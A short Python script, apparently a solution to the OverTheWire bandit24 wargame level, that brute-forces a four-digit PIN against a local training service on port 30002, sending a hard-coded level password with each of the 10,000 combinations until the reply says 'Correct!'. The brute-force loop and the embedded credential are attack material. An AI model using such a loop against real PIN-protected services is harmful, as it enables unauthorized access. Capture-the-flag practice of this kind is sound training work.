#!/usr/bin/env python

'''
    unpin.py -- Simple 4-digit bruteforcer

    overthewire.org 
    bandit24 bruteforcer script

    Disclaimer:
        I am not liable for using this script to bruteforce online pins.
        For CTF purposes / educational use only

'''

import itertools
import socket

# Set globals

passwd = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
host = '127.0.0.1'
port = 30002


def generate_pin():

    # Generate 10000 combinations of 0000-9999 in a list

    pin = [''.join(map(str, i)) for i in itertools.product(range(10), repeat=4)]

    return pin


def send_data(host, port, passwd, pin_list):

    # Send pieces of data to server

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to server

    s.connect((host, port))

    for pin in pin_list:

        pin = str(pin)

        data_src = '%s %s\n' % (passwd, pin)

        s.sendall(data_src.encode('utf-8'))

        data_out = s.recv(1024)

        is_correct = 'Correct!'.encode('utf-8')

        if is_correct in data_out:
            print(data_out.decode('utf-8'))
            break

        else:
            pass


if __name__ == '__main__':

    pin_list = generate_pin()

    send_data(host, port, passwd, pin_list)
